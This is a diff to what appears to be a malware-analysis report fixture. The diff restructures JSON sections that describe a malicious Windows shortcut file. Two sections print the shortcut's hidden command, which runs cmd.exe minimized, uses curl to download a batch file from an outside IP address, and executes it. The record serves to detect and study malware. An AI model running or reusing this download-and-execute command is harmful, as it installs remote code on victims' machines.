@@ -5,7 +5,25 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [4.1529203238237, 4.010206621727226, 3.431239245620366, 5.017883105849065, 3.9636834421390494, 2.7732601197721642, 3.90956638799274, 3.724934445926068]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              4.1529203238237,
+              4.010206621727226,
+              3.431239245620366,
+              5.017883105849065,
+              3.9636834421390494,
+              2.7732601197721642,
+              3.90956638799274,
+              3.724934445926068
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +36,42 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata\", \"file_attributes\": \"Archive\", \"create_date\": \"2021:09:18 17:06:25+00:00\", \"access_date\": \"2022:04:05 02:17:08+00:00\", \"modify_date\": \"2021:09:18 17:06:26+00:00\", \"target_file_size\": 289792, \"icon_index\": \"(none)\", \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"drive_type\": \"Fixed Disk\", \"volume_label\": \"\\u03f5\\u0373\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"working_directory\": \"C:\\\\Windows\\\\System32\", \"command_line_arguments\": \"/c \\\"curl http://121.5.28.63/cmd.txt > %temp%\\\\\\\\cmd.bat && %temp%\\\\\\\\cmd.bat\\\"\", \"machine_id\": \"desktop-gutn2mb\", \"fill_attributes\": \"0x07\", \"popup_fill_attributes\": \"0xf5\", \"screen_buffer_size\": \"120 x 9001\", \"window_size\": \"120 x 30\", \"window_origin\": \"0 x 0\", \"font_size\": \"8 x 18\", \"font_family\": \"Unknown (0x36)\", \"font_weight\": 400, \"font_name\": \"\\u65b0\\u5b8b\\u4f53\", \"cursor_size\": 25, \"full_screen\": \"No\", \"quick_edit\": \"Yes\", \"insert_mode\": \"Yes\", \"window_origin_auto\": \"Yes\", \"history_buffer_size\": 50, \"num_history_buffers\": 4, \"remove_history_duplicates\": \"No\"}",
+        "body": {
+          "access_date": "2022:04:05 02:17:08+00:00",
+          "command_line_arguments": "/c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\"",
+          "create_date": "2021:09:18 17:06:25+00:00",
+          "cursor_size": 25,
+          "drive_type": "Fixed Disk",
+          "file_attributes": "Archive",
+          "fill_attributes": "0x07",
+          "flags": "IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata",
+          "font_family": "Unknown (0x36)",
+          "font_name": "\u65b0\u5b8b\u4f53",
+          "font_size": "8 x 18",
+          "font_weight": 400,
+          "full_screen": "No",
+          "history_buffer_size": 50,
+          "hot_key": "(none)",
+          "icon_index": "(none)",
+          "insert_mode": "Yes",
+          "local_base_path": "C:\\Windows\\System32\\cmd.exe",
+          "machine_id": "desktop-gutn2mb",
+          "modify_date": "2021:09:18 17:06:26+00:00",
+          "num_history_buffers": 4,
+          "popup_fill_attributes": "0xf5",
+          "quick_edit": "Yes",
+          "relative_path": "..\\..\\..\\Windows\\System32\\cmd.exe",
+          "remove_history_duplicates": "No",
+          "run_window": "Show Minimized No Activate",
+          "screen_buffer_size": "120 x 9001",
+          "target_file_dosname": "cmd.exe",
+          "target_file_size": 289792,
+          "volume_label": "\u03f5\u0373",
+          "window_origin": "0 x 0",
+          "window_origin_auto": "Yes",
+          "window_size": "120 x 30",
+          "working_directory": "C:\\Windows\\System32"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -74,7 +127,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"machine_identifier\": \"desktop-gutn2mb\"}",
+        "body": {
+          "machine_identifier": "desktop-gutn2mb"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -94,7 +149,12 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"command_line_arguments\": \"/c \\\"curl http://121.5.28.63/cmd.txt > %temp%\\\\\\\\cmd.bat && %temp%\\\\\\\\cmd.bat\\\"\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\cmd.exe\"}",
+        "body": {
+          "command_line_arguments": "/c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\"",
+          "local_base_path": "C:\\Windows\\System32\\cmd.exe",
+          "relative_path": "..\\..\\..\\Windows\\System32\\cmd.exe",
+          "target_file_dosname": "Windows\\System32\\cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
